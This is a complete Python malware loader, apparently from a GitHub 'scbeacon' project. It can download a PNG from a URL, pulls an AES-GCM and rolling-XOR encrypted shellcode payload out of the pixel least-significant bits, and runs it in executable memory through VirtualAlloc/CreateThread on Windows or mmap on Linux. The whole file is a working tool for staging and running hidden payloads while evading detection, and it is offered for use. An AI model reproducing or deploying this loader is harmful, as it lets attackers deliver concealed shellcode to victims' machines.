#!/usr/bin/env python3
"""
stego_loader.py - Extract and execute shellcode from LSB stego PNG image
                  with multi-layer decryption (AES-256-GCM -> Rolling-XOR)

Usage:
    python stego_loader.py -i image.png -p "password"
    python stego_loader.py -u http://example.com/image.png -p "password"

Dependencies:
    pip install pillow cryptography

Author : https://github.com/kcnewb1e/scbeacon
"""

import argparse
import ctypes
import platform
import struct
import sys
import urllib.request
import io
from PIL import Image
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

MAGIC           = b'\xDE\xAD\xC0\xDE'
DEFAULT_XOR_KEY = 0xAB
KDF_ITERATIONS  = 200_000
KEY_LEN         = 32   # AES-256


def derive_keys(password: str, salt: bytes) -> tuple[bytes, int]:
    """Derive AES-256 key + 1-byte XOR key from password via PBKDF2-SHA256."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=KEY_LEN + 1,
        salt=salt,
        iterations=KDF_ITERATIONS,
    )
    key_material = kdf.derive(password.encode())
    aes_key = key_material[:KEY_LEN]
    xor_key = key_material[KEY_LEN] ^ DEFAULT_XOR_KEY
    return aes_key, xor_key


def layer1_xor_decrypt(data: bytes, key: int) -> bytes:
    """Reverse rolling XOR — mirror of encoder's layer1_xor."""
    out = bytearray(len(data))
    k = key
    for i, b in enumerate(data):
        out[i] = b ^ k
        # key evolution uses the *encrypted* byte (b == encoder's out[i])
        k = (k ^ b ^ (i & 0xFF)) & 0xFF
    return bytes(out)


def layer2_aes_gcm_decrypt(data: bytes, aes_key: bytes, nonce: bytes) -> bytes:
    """AES-256-GCM authenticated decryption."""
    return AESGCM(aes_key).decrypt(nonce, data, None)


def bits_to_bytes(bits: list[int]) -> bytes:
    result = bytearray()
    for i in range(0, len(bits), 8):
        byte = 0
        for j in range(8):
            byte = (byte << 1) | bits[i + j]
        result.append(byte)
    return bytes(result)


def extract(img: Image.Image, password: str) -> bytes:
    img = img.convert('RGB')
    pixels = list(img.getdata())

    flat = []
    for r, g, b in pixels:
        flat.extend([r, g, b])

    def read_bytes(n: int, offset: int) -> tuple[bytes, int]:
        bits = [flat[offset + i] & 1 for i in range(n * 8)]
        return bits_to_bytes(bits), offset + n * 8

    # MAGIC (4 bytes)
    magic, pos = read_bytes(4, 0)
    if magic != MAGIC:
        print("[-] Magic not found. Wrong image or no payload.")
        sys.exit(1)

    # SALT_LEN (2 bytes) + NONCE_LEN (2 bytes)
    salt_len_bytes,  pos = read_bytes(2, pos)
    nonce_len_bytes, pos = read_bytes(2, pos)
    salt_len  = struct.unpack('<H', salt_len_bytes)[0]
    nonce_len = struct.unpack('<H', nonce_len_bytes)[0]

    # PAYLOAD_LEN (4 bytes)
    length_bytes, pos = read_bytes(4, pos)
    length = struct.unpack('<I', length_bytes)[0]

    if length == 0 or length > len(flat) // 8:
        print(f"[-] Invalid payload length: {length}")
        sys.exit(1)

    # SALT + NONCE + CIPHERTEXT
    salt,       pos = read_bytes(salt_len,  pos)
    nonce,      pos = read_bytes(nonce_len, pos)
    ciphertext, _   = read_bytes(length,    pos)

    print(f"[*] Ciphertext size: {length} bytes")
    print(f"[*] Salt           : {salt.hex()}")
    print(f"[*] Nonce          : {nonce.hex()}")

    # Derive keys from password
    aes_key, xor_key = derive_keys(password, salt)

    # Layer 2 decrypt: AES-256-GCM
    try:
        step1 = layer2_aes_gcm_decrypt(ciphertext, aes_key, nonce)
    except Exception:
        print("[-] AES-GCM decryption failed — wrong password or corrupted image.")
        sys.exit(1)

    # Layer 1 decrypt: Rolling XOR
    shellcode = layer1_xor_decrypt(step1, xor_key)
    print(f"[+] Shellcode extracted: {len(shellcode)} bytes")
    return shellcode


def load_image(source: str) -> Image.Image:
    if source.startswith('http://') or source.startswith('https://'):
        print(f"[*] Fetching image: {source}")
        with urllib.request.urlopen(source) as resp:
            data = resp.read()
        return Image.open(io.BytesIO(data))
    else:
        print(f"[*] Reading image: {source}")
        return Image.open(source)


# ── Execution engines ──────────────────────────────────────────────────────────

def exec_windows(shellcode: bytes):
    k32 = ctypes.windll.kernel32

    buf = ctypes.create_string_buffer(shellcode)
    ptr = k32.VirtualAlloc(
        None,
        ctypes.c_size_t(len(shellcode)),
        0x3000,   # MEM_COMMIT | MEM_RESERVE
        0x40      # PAGE_EXECUTE_READWRITE
    )
    if not ptr:
        print("[-] VirtualAlloc failed")
        sys.exit(1)

    k32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, ctypes.c_size_t(len(shellcode)))

    handle = k32.CreateThread(
        None, 0,
        ctypes.c_void_p(ptr),
        None, 0, None
    )
    if not handle:
        print("[-] CreateThread failed")
        sys.exit(1)

    print("[+] Thread created, executing...")
    k32.WaitForSingleObject(handle, 0xFFFFFFFF)


def exec_linux(shellcode: bytes):
    libc = ctypes.CDLL(None)

    sc_len = len(shellcode)

    # mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
    libc.mmap.restype = ctypes.c_void_p
    libc.mmap.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t,
        ctypes.c_int, ctypes.c_int,
        ctypes.c_int, ctypes.c_long
    ]
    ptr = libc.mmap(None, sc_len, 0x7, 0x22, -1, 0)

    if ptr is None or ptr == ctypes.c_void_p(-1).value:
        print("[-] mmap failed")
        sys.exit(1)

    # Copy shellcode into executable memory
    ctypes.memmove(ptr, shellcode, sc_len)

    # Cast to function and call
    func = ctypes.CFUNCTYPE(None)(ptr)
    print("[+] Executing shellcode...")
    func()


def execute(shellcode: bytes):
    os_name = platform.system()
    print(f"[*] Platform       : {os_name}")

    if os_name == 'Windows':
        exec_windows(shellcode)
    elif os_name == 'Linux':
        exec_linux(shellcode)
    else:
        print(f"[-] Unsupported platform: {os_name}")
        sys.exit(1)


# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description='Extract and execute shellcode from LSB stego image (multi-layer)')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-i', '--image', help='Local path to stego PNG')
    group.add_argument('-u', '--url',   help='Remote URL to stego PNG')
    parser.add_argument('-p', '--password', required=True, help='Decryption password')
    parser.add_argument('--extract-only', action='store_true',
                        help='Only extract shellcode, dump to shellcode.bin, do not execute')
    args = parser.parse_args()

    print(f"[*] Decryption     : Rolling-XOR <- AES-256-GCM")
    print(f"[*] KDF iterations : {KDF_ITERATIONS:,}")

    source = args.image or args.url
    img = load_image(source)
    shellcode = extract(img, args.password)

    if args.extract_only:
        out = 'shellcode.bin'
        with open(out, 'wb') as f:
            f.write(shellcode)
        print(f"[+] Shellcode saved to {out} (not executed)")
        return

    execute(shellcode)


if __name__ == '__main__':
    main()
